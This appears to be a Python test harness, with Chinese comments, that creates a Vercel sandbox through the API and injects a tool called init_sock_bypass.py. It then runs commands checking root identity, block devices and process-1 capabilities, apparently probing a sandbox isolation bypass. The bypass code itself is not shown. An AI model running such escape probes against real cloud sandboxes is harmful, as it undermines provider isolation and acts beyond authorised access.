# 实验J78: 端到端验证 init_sock_bypass.py 独立工具 (文件拷贝进沙箱后运行)
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj78"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

TOOL_B64 = base64.b64encode(open("init_sock_bypass.py", "rb").read()).decode()

PROBE = r"""
import os, base64, subprocess

TOOL = base64.b64decode(r""" + '"' + TOOL_B64 + '"' + r""")
open("/tmp/init_sock_bypass.py", "wb").write(TOOL)
os.chmod("/tmp/init_sock_bypass.py", 0o755)
print("tool written, %d bytes" % len(TOOL), flush=True)

print("== 运行: python3 /tmp/init_sock_bypass.py id ==", flush=True)
r = subprocess.run(["python3", "/tmp/init_sock_bypass.py", "id"], capture_output=True, text=True, timeout=120)
print("RC:", r.returncode, flush=True)
print("STDOUT:", r.stdout[:800], flush=True)
print("STDERR:", r.stderr[:400], flush=True)

print("== 运行: python3 /tmp/init_sock_bypass.py sh -c 'id && ls /dev/vda && cat /proc/1/status | head -3' ==", flush=True)
r = subprocess.run(["python3", "/tmp/init_sock_bypass.py", "sh", "-c",
                    "id && ls -la /dev/vda /dev/vdb && grep -E '^(Uid|Cap)' /proc/1/status"],
                   capture_output=True, text=True, timeout=120)
print("RC:", r.returncode, flush=True)
print("STDOUT:", r.stdout[:1200], flush=True)
print("STDERR:", r.stderr[:400], flush=True)
"""
run_cmd(sid, PROBE, "tool-e2e", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
